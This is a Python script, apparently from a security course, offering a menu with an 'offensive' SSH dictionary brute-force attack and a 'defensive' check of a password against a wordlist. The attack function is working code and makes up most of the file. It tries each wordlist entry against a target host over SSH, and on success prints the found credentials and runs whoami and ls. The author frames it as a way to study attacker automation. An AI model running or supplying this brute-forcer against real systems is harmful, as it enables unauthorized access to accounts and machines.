#!/usr/bin/python3


# Script Name: Automated Brute Force Wordlist Tool Pt. 2
# Author: Shay Crane
# Date of last revision: 10/25/2022
# Purpose:  continue the development of a custom tool that performs
#           brute force attacks to better understand the types of
#           automation employed by malicious hackers. 



#import libraries
import time, getpass, sys
from pexpect import pxssh


#define functions
#print menu
def menu():
    print("For Offensive, Dictionary Iterator, enter 1.")
    print("For Defensive, Password Recognition, enter 2.")
    print("To exit, enter 9.")
    choice=input("Enter your choice: ")

    if choice=="1":
        iterator()
    elif choice=="2":
        password_check()
    else: 
        sys.exit 

#iterates user input to access a given system
def iterator():
    host=input("Enter target host IP address: ")
    username=input("Enter target username: ")
    path=input("Enter the filepath to your wordlist:\n ")
    file=open(path,encoding="ISO-8859-1")
    line=file.readline()
    success="no"
    if success=="no":
        while line:
            line=line.rstrip()
            pwd=line
            print(f"Checking '{pwd}'...")
            session=pxssh.pxssh()
            try:
                session.login(host, username, pwd)
                print("\nACCESS GRANTED.")
                session.sendline('uptime')
                session.prompt()
                print(f"the username is: {str(session.before)[12:-5]} the password is: {pwd}")
                print(session.before) #prints everything before the prompt
                session.sendline('whoami')
                session.prompt()
                print((session.before).decode())
                session.sendline("ls -l")
                session.prompt()
                print((session.before).decode())
                session.logout()
                success="yes"
                print("[*] MISSION ACCOMPLISHED. Please wait while I return you to the menu...")
                break

            except pxssh.ExceptionPxssh as e:
                print("Your attempt at login access has failed.")
                print(e)

            except KeyboardInterrupt:
                print("\n\n[*] PROCESS INTERRUPTED.")
                sys.exit()

            time.sleep(.5)
            line=file.readline()

        file.close()

    else: 
        print("[*] MISSION ACCOMPLISHED. Please wait while I return you to the menu...")
        menu()

#password check
def password_check():
    pwrd=getpass.getpass("Enter your password or string: ", stream=None)
    filetwo=input("Enter the file path location of your wordlist: ")
#thanks to https://www.geeksforgeeks.org/python-how-to-search-for-a-string-in-text-files/ 
#for providing an example to work from for this next part of my script: 
    with open(filetwo) as filetwo:
        content=filetwo.read()
        if pwrd in content:
            print("Your password has been found in your wordlist.")
        else: 
            print("{pwrd} was NOT FOUND in your wordlist. Please wait while I return you to the main menu.")
            menu()

#main
#call menu function
menu()